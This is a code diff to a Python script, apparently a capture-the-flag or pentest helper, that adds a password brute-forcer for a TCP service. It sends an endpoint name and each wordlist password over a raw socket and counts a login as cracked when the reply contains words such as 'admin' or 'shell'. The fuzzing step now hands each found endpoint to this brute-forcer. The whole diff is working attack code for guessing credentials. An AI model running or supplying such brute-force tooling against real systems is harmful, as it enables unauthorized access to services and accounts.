@@ -80,27 +80,38 @@ def limit_fuzz_endpoint():
                         if fuzz_again.lower() == 'y':
                             break
                         elif fuzz_again.lower() == 'n':
+                            limit_brute_force(endpoint)
                             return 
                         else:
                             print("Wrong input (y/n)")
                 else:
                     print(f"Endpoint '{endpoint}' was incorrect, reconnecting!")
 
-def limit_send_password():
+def limit_send_password(password, endpoint):
     client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     client_socket.connect((hostname, port))
-    client_socket.sendall()
-
-def limit_brute_force():
-    with open(passwords_wordlist, 'rb') as f:
-        passwords = f.read()
-
-    for password in passwords.decode(errors="ignore").splitlines():
-
-        pass
+    client_socket.sendall(endpoint.encode())
+    response = client_socket.recv(1024).decode(errors="ignore")
+    client_socket.sendall(password.encode())
+    response = client_socket.recv(1024).decode(errors="ignore")
+    if any(word in response.lower() for word in ("success", "admin", "$", "shell")):
+        return True
+    return False
 
 
-        
+def limit_brute_force(endpoint):
+    while True:
+        with open(passwords_wordlist, 'rb') as f:
+            passwords = f.read()
+
+        for password in passwords.decode(errors="ignore").splitlines():
+            if limit_send_password(password, endpoint):
+                print(f"Password found!: '{password}'")
+                return False
+                
+            else:
+                print(f"Password '{password}' was incorrect, reconnecting!")
+
 def main():
     """
     print("There are 2 versions, limitless and limit")
